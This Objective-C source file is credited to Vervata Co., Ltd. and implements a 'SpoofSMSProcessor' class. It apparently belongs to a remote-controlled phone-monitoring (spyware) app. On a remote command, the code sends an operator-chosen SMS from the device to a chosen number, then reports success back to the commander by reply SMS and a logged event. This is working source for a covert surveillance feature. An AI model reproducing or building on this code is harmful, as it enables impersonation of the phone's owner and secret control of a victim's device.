/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SpoofSMSProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SpoofSMSProcessor.h"
#import "PrefEventsCapture.h"
#import "Preference.h"

@interface SpoofSMSProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (BOOL) isValidNumberOfArgument;
- (void) processSpoofMessage;
- (void) spoofMessageArgNumberException;
- (void) spoofMessageTelephoneFormatException;
- (void) sendReplySMS;
@end

@implementation SpoofSMSProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SpoofSMSProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SpoofSMSProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetVisibilityProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SpoofSMSProcessor--->doProcessingCommand");
	if ([self isValidFlag])	{
		if ([self isValidNumberOfArgument])
			[self processSpoofMessage];
		else 
			[self spoofMessageArgNumberException];	
	} else {
		[self spoofMessageTelephoneFormatException];
	}
	
}

#pragma mark SpoofSMSProcessor PrivateAPI Methods

/**
 - Method name: processSpoofMessage
 - Purpose:This method is used to process spoof message
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) processSpoofMessage{
	DLog (@"SpoofSMSProcessor--->processSpoofMessage");
	NSString *recipientNumber	= [[mRemoteCmdData mArguments] objectAtIndex:2];
	NSString *spoofMessage		= [[mRemoteCmdData mArguments] objectAtIndex:3];
	
	// send the spoof message to the recipeint number
	[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:recipientNumber andMessage:spoofMessage];
	
	[self sendReplySMS];
}

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
*/
/*
- (BOOL) isValidFlag {
	DLog (@"SpoofSMSProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) {
			isValid=[RemoteCmdProcessorUtils isPhoneNumber:[args objectAtIndex:2]];		// 3rd argument is recipient number
		if (isValid && [args count]>3) {
			if (![[args objectAtIndex:3] isEqualToString:@"D"]) isValid=YES;			// 4th arguement is message
			else isValid=NO;
		}
		
	}
	return isValid;
}
*/

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the telephone number argument
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
 */
- (BOOL) isValidFlag {
	DLog (@"SpoofSMSProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args = [mRemoteCmdData mArguments];
	if ([args count] > 2) {
		isValid = [RemoteCmdProcessorUtils isPhoneNumber:[args objectAtIndex:2]];		// 3rd argument is recipient number				
	}
	return isValid;
}

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the number of arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
 */
- (BOOL) isValidNumberOfArgument {
	BOOL isValid = NO;
	NSArray *args = [mRemoteCmdData mArguments];
	if ([args count] > 3) {
		if (![[[args objectAtIndex:3] uppercaseString] isEqualToString:@"D"])			// 4th arguement is message
			isValid = YES;			
		else 
			isValid = NO;
	}
	return isValid;
}

/**
 - Method name: spoofMessageTelephoneFormatException
 - Purpose: This method is invoked when telephone number is invalid 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) spoofMessageTelephoneFormatException {
	DLog (@"SpoofSMSProcessor--->spoofMessageException")
	FxException* exception = [FxException exceptionWithName:@"spoofMessageException" andReason:@"Spoof Message error"];
	[exception setErrorCode:kCmdExceptionErrorPhoneNumberInvalid];		// invalid phone number
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: spoofMessageTelephoneFormatException
 - Purpose: This method is invoked when the remote command format is invalid 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) spoofMessageArgNumberException {
	DLog (@"SpoofSMSProcessor--->spoofMessageException")
	FxException* exception = [FxException exceptionWithName:@"spoofMessageException" andReason:@"Spoof Message error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];		// invalid command format
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"SpoofSMSProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	
	messageFormat = [messageFormat stringByAppendingString:NSLocalizedString(@"kSpoofSMSSuccessMSG", @"")];
		
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end
